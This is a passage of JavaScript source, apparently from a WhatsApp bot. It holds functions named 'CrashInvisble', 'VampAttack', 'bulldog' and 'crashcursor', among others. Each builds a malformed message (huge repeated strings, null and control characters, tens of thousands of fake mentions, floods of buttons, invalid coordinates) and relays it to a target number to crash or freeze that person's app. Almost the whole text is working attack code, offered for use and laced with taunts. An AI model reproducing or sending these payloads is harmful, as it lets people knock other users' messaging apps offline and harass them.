/8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧"
                },
                footer: {
                  text: "null.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ null.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function StallerPackFreze(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "AnomaliGEN2" + "軎?".repeat(120000),
                        jpegThumbnail: "",
                        caption: "軎?".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function buton(target) {
return sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Pepek",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonsParamsJson: "",
                },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );
}

async function ButtonDomm(target) {
sock.relayMessage(
target,
{
interactiveMessage: {
header: {
title: "🦠⃰",
hasMediaAttachment: false
},
body: {
text: "\ua9be".repeat(155555)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "z"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},

]
}
}      
},
{ participant: { jid: target } }
);
}
async function VampAttack(target) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "Vampire.biz\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "Aku Kembali Hehe!!!" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "Jangan Bacot Cil..."
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "ᵖᵃˢᵘᵏᵃⁿ ᵃⁿᵗᶦ ᵍᶦᵐᵐᶦᶜᵏ"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, msg.message, { participant: { jid: target } }, { messageId: null });
}
async function carouselprokontol(target) {
    let messageContent = generateWAMessageFromContent(target, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': 'kontol bapak kau pecah by ryzen dek'
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': 'kontol bapak kau pecah by ryzen dek',
              'subtitle': 'kontol bapak kau pecah by ryzen dek',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    sock.relayMessage(target, messageContent.message, {
      'messageId': messageContent.key.id
    });
}
async function bulldog(target, mention = true) { // Default true biar otomatis nyala
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function CrashInvisble(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "( 🍁 ) -Theshi🐉",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "RilzX7",
                address: "RilzX7",
              },
            },
            body: {
              text: "( 🍁 ) -Theshi🐉",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function FlowXPaw(target) {

     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                                hasMediaAttachment: false,
                            },
                            body: {
                                text: "𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋💀",
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "BarzXForce" + "\u0000",
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "BarzXForce" + "\u0000",
                                        },
                                        {
                                                                                name: "single_select",
                                        buttonParamsJson: "andreforce" + "\u0000",
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "BarzXForce" + "\u0000",
                                        },
                                        {
                                        name: "review_and_pay", buttonParamsJson: "BarzXForce" + "\u0003".repeat(9999) },
                        { name: "galaxy_message", buttonParamsJson: "BarzXForce" + "\u0003".repeat(9999) },
                        { name: "cta_call", buttonParamsJson: "BarzXForce" + "\u0003".repeat(9999) 
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
        async function crashcursor(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: 'anre' 
          },
          footer: { 
            text: 'andre' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'haha fc boss',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "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